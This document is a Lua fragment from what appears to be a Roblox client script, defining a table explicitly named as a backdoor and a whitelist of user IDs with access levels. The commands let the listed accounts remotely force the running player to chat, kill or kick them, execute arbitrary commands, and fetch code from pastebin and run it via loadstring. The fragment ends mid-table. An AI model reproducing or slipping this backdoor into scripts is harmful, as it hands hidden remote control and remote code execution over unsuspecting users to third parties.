local BackDoorTableCommands = {
    ['chat'] = {
        ['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Content,"All") end end;
        ['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
    };
    ['notif'] = {
        ['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then StarterGui:SetCore("SendNotification",{['Title'] = "Cy's Messages";['Text'] = Message;['Duration'] = 10;['Icon'] = nil;}) end end;
        ['Levels'] = {[4] = true;}
    };
    ['bring'] = {
        ['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" and CommandedPlayer ~= "none" then CheckCommand("to "..CommandedPlayer.Name) end end;
        ['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
    };
    ['kill'] = {
        ['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then GetChar():BreakJoints() end end;
        ['Levels'] = {[2] = true;[3] = true;[4] = true;}
    };
    ['exec'] = {
        ['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" and CommandedPlayer ~= "none" then CheckCommand(Content) end end;
        ['Levels'] = {[3] = true;[4] = true;}
    };
    ['kick'] = {
        ['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then LP:Kick(Content) end end;
        ['Levels'] = {[3] = true;[4] = true;}
    };
    ['ban'] = {
        ['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.lIIl:FireServer'hipheight' end end;
        ['Levels'] = {[4] = true;}
    };
    ['p'] = {
        ['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then loadstring(game:HttpGet("https://www.pastebin.com/raw/"..Content))() end end;
        ['Levels'] = {[3] = true;[4] = true;}
    };
}

local BackDoorTablePlayers = {
    [2825751971] = {
        ['Name'] = "aphixe"; 
        ['Access'] = 4;
        ['Colour'] = Color3.fromRGB(255,255,255);
    };
    [1671211709] = {
        ['Name'] = "sor";
        ['Access'] = 4;
        ['Colour'] = Color3.fromRGB(255,0,0);
    }
